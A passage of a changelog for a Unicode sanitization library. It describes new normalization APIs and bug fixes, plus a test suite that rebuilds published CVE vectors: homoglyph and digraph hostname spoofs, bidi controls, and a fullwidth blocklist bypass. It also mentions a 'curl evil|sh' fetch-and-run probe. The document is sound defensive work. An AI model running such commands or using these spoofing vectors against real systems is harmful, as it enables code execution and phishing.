  (`findKeyCollisions`), Ruby (`Disarm.find_key_collisions`), the C ABI and Java/Kotlin.

  **The reducer is the policy, and there is no default.** Measured against the four
  collision rows in `docs/security/cve-validation.md`:

  | key | 2026-23950 | 2019-19844 | 2013-7236 | 2020-12063 |
  |---|---|---|---|---|
  | `fold_case` | yes | | | |
  | `search_key` | yes | yes | yes | yes |
  | `catalog_key` | yes | yes | yes | yes |
  | `canonicalize` | | yes | yes | yes |
  | `canonicalize_strict` | | yes | yes | yes |
  | `normalize_confusables` | | yes | yes | yes |

  A stronger key finds more collisions, including ones nobody attacked: `search_key`
  collides `Muller` with `Müller` and `Ivan` with `Иван`. That is not a false positive —
  they really are one key — it is the cost of the key you chose, and choosing it for the
  caller would be choosing their threat model. `sort_key` is deliberately absent: a sort
  key exists *to* collide, so reporting its collisions would be noise.

  **Not `dedup_batch(report=True)`, which the issue offered as the alternative.** That
  helper dedups on the *raw* input as a performance optimisation and never collapses
  `groß.txt` into `gross.txt`'s slot — the collision in the issue's example comes from
  `transliterate`, not from the dedup — so a report bolted onto it would carry one fixed
  reducer and miss three of the four rows above. It is also Python-only by a documented
  scope decision, and node-tar is a Node package.

  The report cannot disagree with the collapse it describes, because both come from one
  pass over one reducer. A group is returned only when it holds two or more **distinct**
  inputs: the same string twice is the same name twice, which a reservation table already
  handles. Groups come back in first-appearance order rather than in hash order.

  `is_case_fold_stable` (#619) remains the single-string half — it says a name *may*
  collide, never with what. This says with what.

- **`is_case_fold_stable` — ask whether a value is a stable identity key before you key a
  table on it (#619).** Answers `fold_case(x) == x.lower()`. A `False` says some *other*
  string folds to the same value, which is the precondition node-tar's `PathReservations`
  guard missed in CVE-2026-23950: `groß.txt` and `gross.txt` are one path on a
  case-insensitive filesystem. Available in Rust (`api::is_case_fold_stable`, and on
  `DisarmStr`), Python (`is_case_fold_stable`, `Text.is_case_fold_stable`), Node
  (`isCaseFoldStable`), Ruby (`Disarm.case_fold_stable?`), the C ABI and Java.

  **It states a fact about the string, not suspicion.** `groß` is an ordinary German word
  and `ﬁle` an ordinary ligature, so the predicate reads `True` for ordinary text and is
  deliberately kept out of `has_anomalies` and out of the CVE detector panel — folding it
  in would flag ordinary German and every Greek word ending in sigma. What to do about a
  `False` is the caller's decision: reserve both forms, reject the name, or key the table
  on `fold_case` rather than `str.lower()`.

  **`str.lower()` is the comparison basis and `str.casefold()` is not.** Casefolding
  performs the very transform under test, so a predicate written against it answers
  `True` for every string in Unicode — the substitution #617 already made once, now
  pinned by a test.

  **Not a per-character table, because a per-character table is wrong for Greek.**
  `ΟΔΟΣ` ("street") lowercases to `οδος` and folds to `οδοσ`, yet `Σ` agrees with itself
  in isolation; `U+03A3` is the only code point in Unicode whose lowercase mapping depends
  on its neighbours, which a Tier-3 test asserts by enumeration rather than by assertion.
  The implementation is allocation-free for anything that contains no capital sigma —
  ASCII short-circuits, everything else scans the folding table in place — and falls back
  to the exact string comparison for the rest, so it cannot drift from what `fold_case`
  actually does.

  CVE-2026-23950's *Detected by* column stops reading `—`. The collision itself is still a
  property of a pair of names and no single-string predicate can report it (#620 tracks
  that); the precondition is what moved. **Measured limit:** the issue paired this with
  CVE-2019-19844, and that half does not hold — that row's probe turns on `U+0131` DOTLESS
  I, which folds *and* lowercases to itself and collides through `.upper()` instead, so
  the predicate is silent on it.

- **Ten CVEs on encoding rather than code points, and the survey method behind them
  (36 → 46 rows).** Found by sweeping NVD across the operations disarm performs, then
  verified one ID at a time.

  | Class | Added |
  |---|---|
  | Overlong / invalid byte sequences | CVE-2024-46954, CVE-2026-44288, CVE-2009-4142 |
  | Lone surrogates | CVE-2022-31116, CVE-2025-64439, CVE-2008-4066 |
  | Full-width evasion of a detector | CVE-2007-2688, CVE-2001-0669 |
  | Encoding layers disarm does not own | CVE-2022-3782, CVE-2006-2753 |

  **The byte-level rows are the first on the page whose input is not a `str`.**
  `decode_to_utf8` replaces overlong sequences rather than decoding them, so the
  Ghostscript traversal never materializes and `strict=True` refuses outright.
  CVE-2026-44288 names the correct behaviour exactly — protobufjs decoded overlong
  sequences "to canonical characters instead of replacing them" — which is what makes
  `not-affected` measurable rather than asserted.

  **CVE-2025-64439 is a Unicode edge case reaching RCE through an error path**: illegal
  surrogates made msgpack serialization fail in LangGraph, and the fallback was JSON
  deserialization of untrusted data. disarm substitutes rather than drops, which is what
  keeps `key<U+DC00>value` from colliding with `keyvalue` — the CVE-2022-31116 shape.

  **CVE-2007-2688 is the Threat Model's ordering rule eighteen years early.** Cisco IPS,
  Check Point and IBM ISS Proventia all shipped the same missing normalization step in the
  same month. It is also the same fold `TestFullwidthUnmaskingHazard` pins as a hazard —
  both readings are correct, and pipeline position decides which applies.

  `docs/security/cve-validation.md` now records **how rows are found**: the NVD sweeps by
  mechanism rather than by product, the per-ID verification that caught CVE-2017-20190
  having no CVSS at all, and the non-CVE research that informed rows — Paul Butler on
  variation-selector smuggling, and the CoreText Telugu crash.

- **The comparator table no longer contradicts the matrix.** CVE-2026-23950 rendered as
  `Neutralized` in the matrix and as `no` under both disarm columns in the comparison a
  hundred lines below, because the comparison scores every row against two *fixed* disarm
  entry points and that row is neutralized by `fold_case`.

  The columns stay fixed on purpose — `decancer` and `unidecode` each expose exactly one
  entry point, so letting disarm pick a different function per row would flatter it.
  Instead the three rows whose matrix neutralizer is neither fixed column now carry a †
  naming the function that does own them, so a `no` reads as *not this function* rather
  than *not disarm*. `test_named_elsewhere_matches_the_registry` derives that set from the
  registry rather than trusting the benchmark's copy, and also checks the named function
  is one the row actually lists.

- **Comparator corpus caught up with the matrix, and gated against falling behind again
  (15 → 22 of 36 rows).** The corpus stopped growing when the matrix went from 20 to 36
  rows, and the drift gate at the time only compared it against `NEUTRALIZABLE` — which
  had stopped growing too. Both sides moved together, so nothing failed and 21 rows fell
  out of the comparison silently.

  Seven comparable rows are now compared: the four terminal-control CVEs (CVE-2025-55754,
  CVE-2024-52005, CVE-2023-43620, CVE-2023-37275), the zalgo row (CVE-2017-20190), the
  Latin kra (CVE-2019-11721) and the sharp-s path collision (CVE-2026-23950).

  **The other 14 are named rather than left unexplained**: 11 out of scope (nothing
  neutralizes them, so nothing to compare), 2 not-affected (a cost property, not a
  transformation), 1 detected without being neutralized.
  `test_every_registry_row_is_compared_or_has_a_reason_not_to` now checks each row against
  the registry rather than against another list that can drift with it.

  **A flaw in the comparison predicate came out of adding the sharp-s row.** The harness
  neutralized case with `str.casefold()`, which performs Unicode full case folding — and
  therefore maps `ß` to `ss` itself. Every tool would have passed CVE-2026-23950 by
  measuring Python rather than the tool. Switched to `str.lower()`, which leaves `ß` alone;
  no other row changed.

  Scores on the widened corpus: `canonicalize` and `strip_obfuscation` 20/22, `decancer`
  16/22, `unidecode` 14/22. The single row where disarm reads `no` and `unidecode` reads
  `yes` is CVE-2026-23950, and it is a deliberate refusal — folding `ß` in the confusable
  table would rewrite ordinary German, so the key builders own that collision. The page
  says so next to the table.

- **Normalization cost as a CVE class, and a fourth disposition to describe it (33 → 36).**
  CVE-2026-3276 (CPython `unicodedata.normalize()` on alternating-CCC runs, CWE-407),
  CVE-2023-46695 (Django NFKC on Windows, re-reported three times since) and
  CVE-2017-20190 ("Zalgo text", disputed, deferred, and carrying **no CVSS score at all** —
  only SSVC).

  The input here is not a disguise, it is a bill, and the existing vocabulary could not say
  what disarm's relationship to it is. `not-affected` now means *the CVE is a defect in
  another implementation of something disarm also does, and disarm's implementation was
  measured and does not have it* — distinct from `out-of-scope`, which means disarm does
  not stop the attack. It is a stronger claim, so it is gated: identical output to CPython
  across all four forms, and a linear-cost bound.

  **disarm is not uniformly faster, and the page says so.** Over nine input shapes at
  20,000 characters it runs between 6× faster (CJK compatibility ideographs) and 10×
  *slower* (already-normalized text, where CPython's quick-check short-circuits and disarm
  does more work). An earlier informal measurement suggested a ~700× margin; that was a
  cold-start artefact and does not survive best-of-N timing.

  **The bound is the actual defense.** `canonicalize` collapses a 2,000-mark pile to at
  most four characters, and `is_zalgo` flags the CVE-2026-3276 payload too — rejecting the
  input costs less than normalizing it quickly. What disarm does **not** do is bound input
  length, which is what the Frigate/Yeti/spbu_se_site CVEs in this family are actually
  about; `test_disarm_does_not_bound_input_length` pins that distinction so the cap is not
  misread as a resource limit.

- **Eleven more CVEs, in the classes the matrix was thinnest on (22 → 33).**

  | Class | Added |
  |---|---|
  | Ordering: normalize-then-validate | CVE-2026-28289, CVE-2024-43093, CVE-2023-41889, CVE-2023-52081 |
  | Terminal control sequences | CVE-2025-55754, CVE-2024-52005, CVE-2023-43620, CVE-2023-37275 |
  | Address bar and deny lists | CVE-2019-11721, CVE-2023-4399 |
  | Case-folding path collision | CVE-2026-23950 |

  **The ordering rows are out of scope on purpose.** disarm can produce the canonical
  form; it cannot make a caller look at it first. CVE-2026-28289 states the bug in the
  Threat Model's own terms — NVD describes a TOCTOU weakness where "the dot-prefix check
  occurs before sanitization removes invisible characters". CVE-2024-43093 is in CISA's
  Known Exploited Vulnerabilities catalog.

  **The terminal class is neutralized and entirely undetected.** All six escape-sequence
  rows are cleaned by `strip_log_injection` and reported by nothing, which is the sharpest
  argument yet for cleaning unconditionally rather than screening first.
  `test_no_detector_reports_any_terminal_control_row` pins that as a class-level claim.

  **CVE-2026-23950 closes a loop.** node-tar's symlink poisoning turns on the `ß`/`ss`
  path collision — the single code point the CVE-2019-19844 exhaustive scan identified as
  the one the confusable table deliberately leaves alone, because `ß` is a real German
  letter. The key builders collide it; the canonicalizers correctly do not.

  Two schema changes fell out of the additions. `cvss` and `cvss_version` are now optional,
  because CVE-2017-20190 has no CVSS record at all — only SSVC — and inventing a number
  would be worse than an empty cell. `v4.0` joins the accepted versions.

  One probe needed adjusting rather than one assertion: ASCII `|` is itself a TR39
  confusable source, so a `curl evil|sh` payload tripped `is_confusable` for reasons
  unrelated to its CVE. The derived-detector gate caught it as a false positive.

- **Corrected: there is no single call that neutralizes every vector (#609 follow-up).**
  The CVE page said `canonicalize` was the one call to make when the attack is unknown.
  That was wrong, and its gate could not catch it, because every vector in the matrix at
  the time happened to be one `canonicalize` handles.

  **CVE-2017-7833** (Firefox, 5.3) is the vector that breaks it: a single Arabic vowel mark
  riding a Latin letter. One mark sits below the zalgo threshold, so `is_zalgo` correctly
  returns `False`, and `canonicalize` *caps* combining marks rather than removing them
  (#429) — so the spoof never collapses onto the genuine host.

  **CVE-2017-5383** (Firefox, 5.3) is the mirror image, and rules out the obvious
  replacement. `strip_obfuscation` removes the mark, but renders punctuation confusables as
  their *names* — `U+2010 HYPHEN` becomes the word "hyphen" — so it never folds to ASCII
  `-`. Neither preset dominates the other and they fail on different inputs, so "5/6 each,
  pick either" is the wrong read.

  Measured across the matrix plus both, **no entry point clears everything**. `catalog_key`
  comes closest — the only one carrying both a confusable step and `strip_accents` — and it
  has no format-stripping step, so the Tags block of CVE-2025-32711 goes straight through.
  The answer is a composition: `canonicalize(strip_zalgo(text, max_marks=0))`.

  `TestOneCall` now gates both halves, including a test that **fails if any single entry
  point ever does become sufficient**, so the guidance is revisited rather than left stale.
  `has_bidi_conflict` also stops reading zero: CVE-2017-7833's Arabic mark beside Latin
  letters is exactly the strong-direction mix it asks about.

- **CVE matrix: comparator columns, split entry-point roles, and a measured "one call"
  answer (#607 follow-up).** Three gaps in the published matrix, all of them the kind that
  make a table look more useful than it is.

  **`canonicalize` is the single call, and that is now measured rather than recommended.**
  The matrix said which entry point handles which CVE; a defender's actual question is
  which call to make when the attack is unknown. `canonicalize` handles all thirteen
  neutralizable vectors, as do `canonicalize_strict`, `strip_obfuscation` and the
  `llm_guardrail` / `rag_ingest` profiles. `strip_format` handles eight — it has no
  confusable step, so every row needing a fold survives it. Every score is pinned in
  `TestOneCallSuperset`.

  **Detection has no such answer, and the asymmetry is the point.** No detector covers the
  matrix, and neither does all of them together: `CVE-2023-24329`, `CVE-2008-2383`,
  `CVE-2019-9535`, `CVE-2025-32711` and `CVE-2019-9636` are silent to every one. All five
  are still neutralized by `canonicalize`, which settles the pipeline question — clean
  unconditionally, and use the detectors to decide whether to *alert*, never whether to
  *clean*. A pipeline that screens first and cleans only what it flagged forwards those
  five untouched.

  **Neutralizers and detectors are separate fields.** They were one `entry_points` list,
  which read as though any name on it would defend the row. `CVE-2019-19844` is the
  clearest case: its neutralizers detect nothing and its only detector rewrites nothing —
  and it was mislabelled *Neutralized* when it is also *Detected*. Each row's detector list
  is now **derived**, not written: the suite runs the row's vector through every detector
  and asserts the list matches what fired.

  **Comparator columns.** `benchmarks/cve_comparators.py` runs disarm, `decancer` and
  `unidecode` over the same vectors under one predicate, and regenerates the published
  table. disarm 13/13, `decancer` 8/13, `unidecode` 10/13 — but the score is the least
  interesting part. `unidecode` maps by sound, so its homoglyph passes are decided by which
  homoglyph the attacker picked (`рroduсt` → `rrodust`, not `product`); `decancer` reorders
  bidi text rather than stripping it, leaving `U+202E` in the output. `decancer-py==0.4.1`
  joins the `bench` extra.

- **CVE validation suite (`tests/test_cve_vectors.py`, `docs/security/cve-validation.md`).**
  The docs encourage security use; nothing checked that against a named attack. Twenty
  published CVEs are now reconstructed from the vector each one describes and asserted
  against disarm's real behaviour, in the CI gate, across six classes:

  | Class | CVEs |
  |---|---|
  | Source code and identifiers | CVE-2021-42574, CVE-2021-42694 |
  | Identity and account takeover | CVE-2019-19844, CVE-2013-7236, CVE-2020-12063 |
  | Filesystem and paths | CVE-2014-9390, CVE-2009-3376, CVE-2023-33955 |
  | Hostnames and URLs | CVE-2017-7832, CVE-2023-24329, CVE-2019-9636 |
  | Terminal output and logs | CVE-2008-2383, CVE-2019-9535 |
  | ML / LLM input | CVE-2025-32711, CVE-2024-5184, CVE-2024-5565, CVE-2023-29374, CVE-2023-36258, CVE-2024-3098, CVE-2023-32786 |

  **Seven rows are out-of-scope negatives, and that is the point.** A suite that recorded
  only wins would quietly convert THREAT_MODEL.md's "no guarantee that any class of attack
  is fully neutralized" into a coverage claim. The negatives are asserted so the limits
  cannot drift into untested marketing — including two rows where canonicalizing in the
  *wrong* pipeline position makes an attack worse: `＿＿ｉｍｐｏｒｔ＿＿` becomes executable
  ASCII under NFKC (CVE-2024-3098's `safe_eval` blocklist), and `＃` becomes a real `#`
  that moves where a host ends (CVE-2019-9636).

  Four findings came out of measuring rather than assuming. `has_bidi_conflict()` is
  correctly False for every Trojan Source payload — they are ASCII plus controls, with no
  strong RTL run — so it is not the detector for that family. `collapse_whitespace()`
  leaves a leading NUL, so it does not close CVE-2023-24329 on its own. `ᴀ` (U+1D00) has
  no uppercase mapping at all, so it is not a CVE-2019-19844 vector despite looking like
  the obvious one; the real collision class (non-ASCII code points whose `.upper()` is
  pure ASCII) is exactly ten members wide, walked exhaustively over all of Unicode in
  ~0.2s, and nine fold at `canonicalize_strict` while `ß` closes only under `fold_case`.
  And there is no "old CVEs are CVSS v2" rule: NVD backfilled a v3.1 score for
  CVE-2014-9390 while leaving CVE-2013-7236 and CVE-2009-3376 v2.0-only, so each row
  records the revision it quotes.

  `ml_normalize()` passes all twelve bidi controls, PUA, and homoglyphs through unchanged
  — it is a tokenizer-hygiene preset, not a screen. The `llm_guardrail` and `rag_ingest`
  profiles are the entry points for untrusted text, and that is now asserted rather than
  implied.

  The suite is mutation-checked: neutering any of nine entry points turns it red, so no
  assertion passes vacuously. `TestDocsMatrixDrift` derives the published table's scores
  and disposition wording from the registry, so a row cannot be softened in Markdown
  alone.

- **31 real-attacker confusable mappings TR39 does not carry (#597).** Miss-mining the
  **BitCore** subset of the BitAbuse corpus (Lee et al., NAACL Findings 2025) with
  `benchmarks/adversarial_eval` surfaced codepoints that attackers substitute for
  basic-Latin letters and that TR39 does not list as sources at all, so
  `normalize_confusables` left them unfolded. `ɴ`→`n` alone accounts for 4,576 real
  occurrences; the top three (`ɴ`, `ʍ`, `ɾ`) are 74% of the Tier-1 mass.

  They arrive in a **new file**, `data/confusables_attested.tsv`, not in
  `confusables_supplement.tsv`. That file declares itself *cross-script* and pins its
  provenance to one measured dataset above a stated danger threshold (#336); 18 of these
  sources are Latin folding to Latin, and none comes from that dataset. Two admission
  criteria, two provenance stories, two files — the generator merges them, but the audit
  trails stay separate.

  **The contract widens, and that is deliberate.** Tier 1 (23 rows) are optical twins.
  Tier 2a (7) are *positional* — an attacker reached for an Armenian, Georgian or runic
  glyph by its place in the word, not because it resembles the letter — and Tier 2b (1) is convention. Admitting 2a means this table now encodes **observed attacker
  substitution**, which is wider than visual confusability; Unicode would not accept
  those rows upstream. The tier is recorded per row, and the widened rule is stated in
  `docs/user-guide/confusables.md` and `THREAT_MODEL.md` rather than left implicit.

  Two details worth knowing. `µ` U+00B5 is folded alongside `μ` U+03BC, because NFKC maps
  one to the other and folding only one would make the result depend on the input's
  normalization form. And six rows fold an **uppercase** source to a lowercase target
  (`Ƿ Ʌ Ա Ⴝ Ⴍ Ⴓ`), which no generated row does — the generated pipeline reconciles case to
  the source and these bypass it. The attested form is kept, because the evidence is the
  letter the attacker meant, not its case.

  Per the #39/#40 guardrail the corpora are measuring instruments, never optimization
  targets: the synthetic BitViper tail — 254 further codepoints, 733,029 occurrences,
  98.5% of all novel misses — is excluded by construction, and no row is justified by a
  benchmark score. Latin table 2,189 → 2,220 mappings; the Cyrillic table is untouched,
  since seven of these sources already fold there and the new rows set the Latin column
  only.

- **The C header is committed and drift-gated (#580).** `bindings/cabi/disarm.h` was
  gitignored and regenerated inside the CI step that then compiled `smoke.c` against it.
  Both sides therefore moved together: a signature change plus a matching call-site
  change was self-consistent and passed. That is how a widened
  `disarm_normalize_confusables` (2 args → 3) reached review on #574 with every check
  green — a human reading the diff caught it, no test did.

  The header is now a committed baseline, the same way `src/metadata.rs` and
  `generated/parity.yaml` are committed and drift-checked rather than regenerated blind.
  CI diffs the regenerated header against it in the `cabi` job, so every ABI change is a
  visible diff someone has to approve. A second test pins the arity of the entry points
  that shipped before 0.14, so a widening fails by name rather than as one line in a
  346-line diff.

  The gate does not judge whether a change is breaking — it makes changes visible.
  Deciding that a diff is additive (a new `_opts` entry point) rather than breaking (a
  widened signature) stays the reviewer's job.



- **Selectable digit-mapping policy (#561).** disarm folds a non-Latin digit to the ASCII
  **digit**; upstream TR39 folds several of them to a Latin **letter** (`०` → `o`, `೦` →
  `O`, `١` → `l`). Neither is wrong — numeric is right for prose, where a Devanagari zero
  really is a zero, and the letter is right for an identifier *skeleton*, whose only job
  is to make two confusable identifiers collide. The divergence was fixed in the table
  with no way to select the other side, so it read as a defect to anyone scoring disarm
  against a TR39-derived benchmark and cost points silently.

  `digit_policy` now selects it: `"numeric"` (default, unchanged behaviour) or `"tr39"`.
  Reaches Python (`normalize_confusables(..., digit_policy=…)` and `Text`), Rust
  (`api::normalize_confusables_with` + the `DigitPolicy` enum), Node (`digitPolicy`
  option), Ruby (`digit_policy:` keyword), Java/Kotlin (`DigitPolicy` enum), and the
  C ABI.

  The Rust surface adds a *second function* rather than a third parameter on
  `normalize_confusables`: that is the crate's most-used security primitive and the policy
  is rarely set, so widening it would tax every call site for something almost none of
  them need. `normalize_confusables(text, target)` is unchanged.

  The divergent rows are **generated**, not hand-maintained:
  `scripts/gen_confusables.py` already computes both sides — it makes this exact choice at
  generation time via `enforce_digit_target` (#439) — so the discarded alternative is now
  emitted as `src/tables/data/confusables_digit_tr39.tsv` (45 rows) and build.rs turns it
  into an override PHF. An override *set* rather than a second full table, so the two
  policies cannot drift on the rows they agree on, which is all but 45 of them.

  Scope: the policy is a property of the `normalize_confusables` entry point only. The
  presets (`canonicalize`, `catalog_key`, `search_key`, …) serve prose and keys, where
  numeric is unambiguously right, so they have no switch. Hostname analysis also stays
  numeric — selecting TR39 there would silently change what `is_suspicious_hostname`
  flags, which is a security-behaviour change and belongs in its own issue.

  Scope, second axis: `"tr39"` applies to the **Latin** target only; with any other
  target script it is a no-op and the fold behaves exactly as `"numeric"`. The override
  set is generated from the Latin table and its values are TR39's Latin-script targets,
  so consulting it under `target_script = "cyrillic"` emitted Latin letters into a
  Cyrillic skeleton (`०` folded to `o`, not `0`) and invented folds for sources the
  Cyrillic table deliberately has no row for. Three of those leaked outputs (`Ʌ`, `o`,
  `rn`) are themselves confusable with Cyrillic, so the fold did not even reach a fixed
  point.

- **`ml_normalize` reaches every binding.** It was Rust + Python only, recorded in
  `scripts/parity.py` as a deliberate scope decision. That decision does not survive
  contact with what the preset is *for*: it is the ML/NLP entry point, so keeping it
  Python-only meant a Node or JVM model pipeline could not use disarm for the thing
  disarm built it to do. Now exposed as `mlNormalize` (Node, Java/Kotlin),
  `Disarm.ml_normalize` (Ruby), `String.mlNormalize` (Kotlin extension), and
  `disarm_ml_normalize` (C ABI), each with the `fold_case` switch from #559.

- **Multi-codepoint confusable sources — contraction (#562).** The confusable tables map
  one codepoint to one-or-more (`0271` → `rn`), so *expansion* always worked.
  *Contraction* — recognising that `rn` may stand in for `m` — could not be expressed at
  all: the source column of both TSVs is a single hex codepoint in every data row. This
  was a schema change before it was a data change.

  `is_suspicious_hostname(host, contractions=True)` /
  `api::analyze_hostname_with(host, true)` now folds ASCII digraphs that can impersonate a
  single letter into the canonical form, so `arnazon.com` canonicalizes to `amazon.com`.
  Reaches Python, Rust, Node, Ruby, Java/Kotlin, and the C ABI.

  **Off by default and confined to the hostname path.** Unconditional contraction is worse
  than none: `rn` → `m` is right for `arnazon` and wrong for `earnings`, `turnip`, `born`.
  A hostname is the one place where the threat model justifies those false positives and
  there is no running prose to corrupt. It is not reachable from `normalize_confusables`
  at any setting; a general-text mode would need its own disambiguation story.

  Three rules, each with recorded provenance: `rn` → `m` is the one TR39 itself sanctions
  (it reduces `m` to the sequence `rn`, and 17 sources fold *to* `rn`, the dominant
  multi-character target in the file); `vv` → `w` and `cl` → `d` are disarm additions from
  the IDN homograph literature. Every rule is a false-positive source, so the bar is
  "documented real-world technique", not "plausible".

  Matching is **leftmost-longest** over an Aho-Corasick automaton (reusing the dependency
  #242 already brought in), and applied **per label**, so a digraph can never form across
  a dot. One pass is a fixed point by construction: `build.rs` asserts no rule's output
  occurs inside any rule's input, so a pass cannot expose a fresh match, and a data edit
  that introduced such a chain fails the build.

  Argument style follows each ecosystem: an options object in Node/TypeScript, keyword
  arguments in Ruby, a `MlNormalizeOptions` builder in Java (mirroring the existing
  `TransliterateOptions`), default parameters on the Kotlin extension, and positional
  arguments with a nullable `lang` in the C ABI.

  `ml_normalize` is removed from `SCOPE_REVIEW` in `scripts/parity.py`; the op now reads
  ✓ across rust/python/ruby/node in the parity matrix.


- **Nightly Hypothesis run (`.github/workflows/nightly-hypothesis.yml`).** Tier 2 is
  excluded from PR CI on purpose (~440 tests, non-deterministic, slow) and is not in the
  Tier-3 release gate either, so it ran only when a developer happened to run the full
  suite locally. #570 sat undetected in exactly that gap.

  Runs at 03:17 UTC and on demand, with `--hypothesis-seed=random` so consecutive nights
  explore different input space, and `ORACLE_MAXEX=20000` — 10× the local default — for
  the adversarial-oracle suite, the one env-tunable budget in the tier and the suite that
  found #570. A failure opens (or comments on) a single rolling issue rather than
  disappearing into a run log.

  Deliberately **not** a required check and **not** in the publish path: a probabilistic
  suite must never be able to block a security release. It reports; a human triages.

- **The bundled `confusables.txt` version is readable at runtime (#560).** Nothing in
  the library reported which upstream release the confusable tables were folded from.
  The number existed — in the TSV header and in `docs/provenance.md` — but both are
  build-time artifacts, so a deployment could not answer "is my fold stale?" without
  inferring it from behaviour. It is now exposed everywhere:
  `disarm::api::CONFUSABLES_VERSION` (and `api::confusables_version()`) in Rust,
  `disarm.CONFUSABLES_VERSION` in Python, `confusablesVersion()` in Node and
  Java/Kotlin, `Disarm.confusables_version` in Ruby, and
  `disarm_confusables_version()` in the C ABI.

  `build.rs` parses the value out of the TSV header it already reads, so the constant
  cannot drift from the data it describes, and the build fails if that header stops
  naming a version. Both confusable tables are folded from one upstream release, which
  `build.rs` asserts, so a single constant covers them.

  There is deliberately **no** library-wide `UNICODE_VERSION`: disarm's bundled tables
  track different releases (confusables 17.0.0, case folding 16.0, East Asian width
  15.1.0), so one number would be wrong for three of the four. See
  `docs/provenance.md` for the full table and the per-language accessors.

- **`ml_normalize` takes `fold_case=False` (#559).** The preset folds case
  deliberately, and that is defensible — most tokenizers are uncased. What was missing
  was a way to turn it off for one call. A caller who wants everything else the preset
  does (NFKC, demojize, transliterate, strip-accents, control and zero-width removal,
  whitespace folding) in front of a **cased** model now has a route to it. The fold is
  destructive and cannot be undone downstream, and an uncased evaluation harness cannot
  measure what it costs.

  Default `true`/`True`, so existing behaviour is unchanged. The flag drops
  `Step::FoldCase` and nothing else; the no-fold step list is *derived* from the folded
  one by a `const fn`, so the two cannot drift, and a build-time assertion fires if the
  pipeline ever stops containing exactly one fold step.

  `ml_normalize` is Rust + Python only (Node/Ruby/Java/C-ABI do not expose it — a
  standing scope decision recorded in `scripts/parity.py`), so the flag reaches
  `disarm::api::ml_normalize`, `disarm.ml_normalize`, and `Text.ml_normalize`.

  Note `fold_case=False` restores case, not diacritics: `strip_accents` is a separate
  step and still runs, so `José` becomes `Jose`. See below.

- **Confusables coverage introspection (#563).** `find_untranslatable` has existed for
  transliteration since #184; there was no confusables analogue, so answering "which
  sources does disarm not fold?" meant building a harness outside the library against a
  cached copy of `confusables.txt`. Two read-only accessors now answer it from inside:

  - `unmapped_confusables(target)` — every source in the bundled upstream file that the
    chosen table does not fold, sorted.
  - `find_unmapped_confusables(text, target)` — the same question for one input, in the
    shape of `find_untranslatable`: `(char, byte_offset)` in order of appearance.

  Both reach Rust, Python, Node, Ruby, Java/Kotlin, and the C ABI.

  The denominator is generated: `scripts/gen_confusables.py` now emits
  `src/tables/data/confusables_upstream_sources.tsv` (the source set it already read and
  discarded), and build.rs turns it into a PHF set. The exposure set is **derived** at
  runtime — upstream sources minus the resolved table's keys — so it cannot go stale
  against the table it describes, and one denominator covers both targets. The existing
  confusable TSVs regenerate byte-identically; this change is purely additive.

  The per-input scan composes exactly as the fold does (#475/#477/#483), so a decomposed
  homoglyph whose precomposed form is mapped counts as covered, and offsets anchor to
  the caller's string rather than to the composed intermediate — matching
  `find_untranslatable`'s guarantee.

  Read the result as **exposure**, not as a score: a tool at 95% per-source coverage is
  one query away from the other 5%, and this set is where an adaptive attacker goes.
  Nothing is filtered out, which means the Latin set contains five ASCII characters
  (`%`, `0`, `1`, `I`, `m`) — TR39 is a skeleton transform (m→rn, I/1→l, 0→O) and disarm
  deliberately does not apply those rows, so a scan over ordinary English reports the
  letter `m`. Documented on every surface; a coverage report that quietly drops rows
  reads as coverage it does not have.

### Changed (breaking)

- **`disarm::api::ml_normalize` gains a fourth parameter, `fold_case: bool`.** Rust
  callers must add `true` to keep the current behaviour:
  `ml_normalize(text, lang, emoji_style)` → `ml_normalize(text, lang, emoji_style, true)`.
  Python, which takes it as a keyword with a default, is unaffected. (#559)

### Fixed

- **`canonicalize_strict` was not idempotent (#638).** `f(f(x)) != f(x)` for a class of
  inputs #615 created. `canonicalize_strict("C҉̧")` returned `Ç`, and applying it again
  returned `C` — a comparison key that depends on how many times you applied it, which is
  the one thing a comparison preset must not have.

  **`U+0489` has ccc 0, which makes it a *starter*:** it blocks `C` + `U+0327` from
  composing, so the confusable fold's fixed point correctly finds nothing to do. The #615
  cross-script mark strip then removes it — a Cyrillic mark on a Latin base is exactly its
  target — leaving the two adjacent, and the terminal NFC composes them into `Ç`, which
  folds to `C`. One pass too late.

  So the two steps expose work for each other in **both** directions. #615 reasoned about
  one: the fold rewrites the base, so a mark that matched beforehand can stop matching
  afterwards, which is why the strip goes second. This is the other: the strip removes
  marks, which can expose a composition the fold has already finished with. Neither
  ordering is a fixed point alone, so they now iterate together. It converges because
  every pass either folds a character or deletes a mark, and neither is undone.

  Measured: `canonicalize_strict` only — `canonicalize` and `strip_obfuscation` have no
  cross-script mark step. 474 code points reach the shape in the `C` + X + cedilla probe
  alone; they are the composition-blocking starters that are also script-specific marks
  (`U+0488`, `U+0489`, the Thaana vowel signs, and others). Verified over ~6.8M probes of
  base × code point × mark, with zero non-idempotent results.

  Found by `canonicalize_strict_idempotent` on CI, at 569 successes — the same proptest
  that caught #615's first ordering attempt. The failing seed is now committed so it fails
  deterministically rather than randomly.

  Implemented as a dedicated pipeline step rather than the generic `FixedPoint`
  combinator, which allocates per inner step per pass and took `canonicalize_strict` from
  6 allocations per call to 12 — `preset_alloc_count` refused it. The dedicated step
  reuses buffers and exits after the first strip when the strip changed nothing, so text
  with no cross-script mark (essentially all text) pays nothing for the loop.

- **The two CVE rows behind "no single call" are closed, and they had to close together
  (#614, #615).** Each was one of the exactly two vectors that made
  `docs/security/cve-validation.md` say no entry point cleared everything, so fixing one
  alone would have left the other failing and forced the guidance to be rewritten twice.

  **#614 — `strip_obfuscation` named confusables instead of folding them.** 49 code
  points appear in both `emoji_single.tsv` and `confusables_to_latin.tsv`, and most are
  not emoji: typographic punctuation, currency, math operators, CJK brackets. They reach
  the emoji table from CLDR `annotationsDerived`, which names non-emoji characters.
  `strip_obfuscation("€xample.com")` produced `"euro xample.com"`, so the spoof and the
  genuine host stopped being equal rather than becoming equal — CVE-2017-5383 surviving a
  preset documented as maximum-strength deobfuscation.

  **Not fixed the way the issue proposed.** Reordering the confusable fold before
  `demojize` would break idempotency: punctuation inside emoji *names* (the `’` in
  "woman’s hat") has to be folded by the confusable pass. That ordering is documented
  three times and pinned by `tests/test_presets.py`. Instead the overlap is derived at
  build time as an intersection of the two tables — so it cannot drift the way a curated
  list would — and `demojize` skips those rows inside comparison presets only. Standalone
  `demojize("I ❤ €5")` still returns `"I red heart euro 5"`, which is what that function
  is for. `build.rs` asserts the count is 49, so a table refresh that claims another
  confusable source fails the build instead of widening the gap silently.

